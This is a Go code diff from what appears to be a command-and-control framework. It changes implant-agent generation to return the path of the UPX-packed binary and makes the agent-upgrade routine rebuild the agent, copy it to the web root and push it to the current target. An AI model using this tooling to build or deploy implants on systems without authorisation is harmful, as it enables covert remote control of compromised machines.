@@ -34,7 +34,12 @@ var Arch_List = []string{
 	"riscv64",
 }
 
-func GenAgent() {
+// a wrapper for CmdFuncs
+func genAgentWrapper() {
+	CliPrint("Generated agent binary: %s", GenAgent())
+}
+
+func GenAgent() (agent_binary_path string) {
 	var (
 		outfile     string           // write agent binary to this path
 		arch_choice string = "amd64" // CPU architecture
@@ -120,6 +125,7 @@ func GenAgent() {
 	// done
 	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
 		outfile, stubFile, EmpConfigFile, outfile)
+	agent_binary_path = outfile
 
 	// pack it with upx
 	packed_file := fmt.Sprintf("%s.packed", outfile)
@@ -141,7 +147,12 @@ func GenAgent() {
 	err = os.WriteFile(packed_file, toWrite, 0755)
 	if err != nil {
 		CliPrintError("Failed to save final agent binary: %v", err)
+		return
 	}
+
+	agent_binary_path = packed_file
+
+	return
 }
 
 // PackAgentBinary pack agent ELF binary with Packer()
@@ -165,8 +176,13 @@ func PackAgentBinary() {
 
 func UpgradeAgent() {
 	if !util.IsExist(WWWRoot + "agent") {
-		CliPrintError("Make sure %s/agent exists", WWWRoot)
-		return
+		CliPrintWarning("%s/agent not found, we need to rebuild an agent binary", WWWRoot)
+		agent_bin := GenAgent()
+		err := util.Copy(agent_bin, WWWRoot+"agent")
+		if err != nil {
+			CliPrintError("Copying agent binary to %s: %v", WWWRoot, err)
+			return
+		}
 	}
 	checksum := tun.SHA256SumFile(WWWRoot + "agent")
 	SendCmdToCurrentTarget(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdUpdateAgent, checksum), "")
